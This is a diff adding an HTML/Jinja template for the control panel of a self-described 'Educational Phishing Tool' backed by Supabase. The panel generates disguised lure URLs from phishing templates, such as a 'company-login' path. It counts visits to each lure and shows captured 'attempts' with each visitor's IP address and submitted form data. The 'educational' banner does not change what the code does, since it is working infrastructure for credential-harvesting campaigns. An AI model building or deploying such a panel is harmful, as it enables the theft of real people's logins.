@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Educational Phishing Tool - Control Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 min-h-screen">
+    <div class="container mx-auto px-4 py-8">
+        <!-- Warning Banner -->
+        <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6">
+            <strong>EDUCATIONAL TOOL ONLY:</strong> {{ warning }}
+        </div>
+
+        <h1 class="text-3xl font-bold text-center mb-8">Educational Phishing Tool with Supabase</h1>
+
+        <!-- URL Creation Form -->
+        <div class="bg-white rounded-lg shadow p-6 mb-8">
+            <h2 class="text-xl font-semibold mb-4">Create Custom Phishing URL</h2>
+            
+            <form id="urlForm" class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium mb-2">Select Template:</label>
+                    <select name="template_type" class="w-full p-2 border rounded" required>
+                        {% for key, value in templates.items() %}
+                        <option value="{{ key }}">{{ value }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+
+                <div>
+                    <label class="block text-sm font-medium mb-2">Custom URL Path (optional):</label>
+                    <input type="text" name="custom_path" placeholder="e.g., company-login" 
+                           class="w-full p-2 border rounded" 
+                           pattern="[a-zA-Z0-9-]+" 
+                           title="Only letters, numbers, and hyphens allowed">
+                    <p class="text-sm text-gray-600 mt-1">Leave empty for random generated path</p>
+                </div>
+
+                <button type="submit" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
+                    Generate URL
+                </button>
+            </form>
+
+            <div id="result" class="mt-4 hidden"></div>
+        </div>
+
+        <!-- Generated URLs from Supabase -->
+        <div class="bg-white rounded-lg shadow p-6">
+            <h2 class="text-xl font-semibold mb-4">Generated URLs (Stored in Supabase)</h2>
+            
+            {% if urls %}
+            <div class="overflow-x-auto">
+                <table class="min-w-full table-auto">
+                    <thead>
+                        <tr class="bg-gray-50">
+                            <th class="px-4 py-2">URL Path</th>
+                            <th class="px-4 py-2">Template</th>
+                            <th class="px-4 py-2">Visits</th>
+                            <th class="px-4 py-2">Created</th>
+                            <th class="px-4 py-2">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for url in urls %}
+                        <tr class="border-b">
+                            <td class="px-4 py-2">
+                                <a href="/{{ url.custom_path }}" target="_blank" class="text-blue-500 hover:underline">
+                                    /{{ url.custom_path }}
+                                </a>
+                            </td>
+                            <td class="px-4 py-2">{{ url.template_type }}</td>
+                            <td class="px-4 py-2">{{ url.visits }}</td>
+                            <td class="px-4 py-2">{{ url.created_at[:16] }}</td>
+                            <td class="px-4 py-2 space-x-2">
+                                <button onclick="deleteUrl('{{ url.custom_path }}')" 
+                                        class="bg-red-500 text-white px-2 py-1 rounded text-sm hover:bg-red-600">
+                                    Delete
+                                </button>
+                                <button onclick="viewStats('{{ url.custom_path }}')" 
+                                        class="bg-green-500 text-white px-2 py-1 rounded text-sm hover:bg-green-600">
+                                    Stats
+                                </button>
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+            {% else %}
+            <p class="text-gray-500">No URLs generated yet. Data is stored in Supabase.</p>
+            {% endif %}
+        </div>
+
+        <!-- Stats Modal -->
+        <div id="statsModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center">
+            <div class="bg-white rounded-lg p-6 max-w-2xl w-full mx-4">
+                <h3 class="text-xl font-semibold mb-4">URL Statistics</h3>
+                <div id="statsContent"></div>
+                <button onclick="closeStats()" class="mt-4 bg-gray-500 text-white px-4 py-2 rounded">
+                    Close
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // URL creation form
+        document.getElementById('urlForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const resultDiv = document.getElementById('result');
+            
+            try {
+                const response = await fetch('/create-url', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    resultDiv.className = 'mt-4 p-4 bg-green-100 text-green-700 rounded';
+                    resultDiv.innerHTML = `
+                        <strong>Success!</strong> ${data.message}
+                        <br><strong>URL:</strong> 
+                        <a href="${data.url}" target="_blank" class="underline">${data.url}</a>
+                    `;
+                    resultDiv.classList.remove('hidden');
+                    setTimeout(() => location.reload(), 2000);
+                } else {
+                    throw new Error(data.error);
+                }
+            } catch (error) {
+                resultDiv.className = 'mt-4 p-4 bg-red-100 text-red-700 rounded';
+                resultDiv.innerHTML = `<strong>Error:</strong> ${error.message}`;
+                resultDiv.classList.remove('hidden');
+            }
+        });
+
+        // Delete URL
+        async function deleteUrl(path) {
+            if (confirm('Are you sure you want to delete this URL?')) {
+                try {
+                    const response = await fetch(`/delete-url/${path}`, {
+                        method: 'DELETE'
+                    });
+                    const data = await response.json();
+                    if (data.success) {
+                        location.reload();
+                    }
+                } catch (error) {
+                    alert('Error deleting URL');
+                }
+            }
+        }
+
+        // View statistics
+        async function viewStats(path) {
+            try {
+                const response = await fetch(`/stats/${path}`);
+                const data = await response.json();
+                
+                if (data.error) {
+                    alert(data.error);
+                    return;
+                }
+                
+                const modal = document.getElementById('statsModal');
+                const content = document.getElementById('statsContent');
+                
+                content.innerHTML = `
+                    <h4 class="font-semibold">URL: /${path}</h4>
+                    <p>Template: ${data.url_data.template_type}</p>
+                    <p>Total Visits: ${data.url_data.visits}</p>
+                    <p>Attempts Captured: ${data.attempt_count}</p>
+                    
+                    ${data.attempt_count > 0 ? `
+                    <div class="mt-4">
+                        <h5 class="font-semibold">Recent Attempts:</h5>
+                        <div class="max-h-60 overflow-y-auto">
+                            ${data.attempts.slice(0, 5).map(attempt => `
+                                <div class="border-b py-2">
+                                    <p>IP: ${attempt.ip_address}</p>
+                                    <p>Time: ${attempt.timestamp}</p>
+                                    <p>Data: ${JSON.stringify(attempt.form_data)}</p>
+                                </div>
+                            `).join('')}
+                        </div>
+                    </div>
+                    ` : ''}
+                `;
+                
+                modal.classList.remove('hidden');
+                modal.classList.add('flex');
+                
+            } catch (error) {
+                alert('Error loading statistics');
+            }
+        }
+
+        function closeStats() {
+            const modal = document.getElementById('statsModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+    </script>
+</body>
+</html>
